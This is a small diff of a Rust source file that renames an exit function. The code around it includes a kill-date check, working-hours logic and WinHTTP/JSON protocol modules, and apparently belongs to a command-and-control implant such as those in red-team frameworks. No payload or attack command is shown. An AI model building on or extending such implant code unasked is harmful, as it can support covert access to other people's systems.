@@ -21,7 +21,7 @@ use mod_protocol_json::protocol::JsonProtocol;
 #[cfg(feature = "protocol-winhttp")]
 use mod_protocol_winhttp::protocol::WinHttpProtocol;
 
-use crate::command::{exit_command, task_type_a, task_type_b};
+use crate::command::{command_exit, task_type_a, task_type_b};
 use crate::common::generate_path;
 
 #[cfg(feature = "std-runtime")]
@@ -44,7 +44,7 @@ where
 
         //KillDate
         if check_kill_date(instance().config.kill_date) {
-            exit_command(1);
+            command_exit(1);
         }
 
         // !Working Hours -> continue
